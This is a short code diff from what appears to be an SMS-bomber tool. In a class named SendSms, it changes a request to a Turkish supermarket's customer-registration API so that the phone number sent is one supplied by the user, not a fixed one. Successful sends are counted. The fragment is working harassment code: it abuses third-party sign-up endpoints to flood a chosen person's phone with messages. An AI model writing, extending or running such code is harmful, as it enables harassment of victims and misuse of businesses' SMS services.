@@ -460,7 +460,7 @@ class SendSms():
     #apaydinsupermarket.com
     def Aydin(self):
         try:
-            r = requests.post("https://apistore.apaydinsupermarket.com:443/api/musteriGirisKayit", data={"cep_tel": "5078214930"})
+            r = requests.post("https://apistore.apaydinsupermarket.com:443/api/musteriGirisKayit", data={"cep_tel": str(self.phone)})
             if (r.json()["result"]["status"]) == "OK":
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> apaydinsupermarket.com")
                 self.adet += 1
